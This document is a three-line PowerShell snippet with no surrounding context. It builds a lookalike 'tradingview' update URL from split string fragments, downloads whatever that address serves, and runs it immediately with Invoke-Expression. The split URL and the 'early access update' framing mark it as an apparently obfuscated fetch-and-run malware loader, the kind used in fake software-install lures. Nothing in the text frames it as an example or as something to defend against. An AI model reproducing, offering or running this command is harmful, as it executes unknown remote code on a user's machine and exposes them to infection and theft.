$p1='https://betasignal'; $p2='tradingview'; $p3='ai.app/update/'; $slug='earlyaccessuser'
$endpoint=$p1+$p2+$p3+$slug
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest $endpoint -UseBasicParsing).Content))
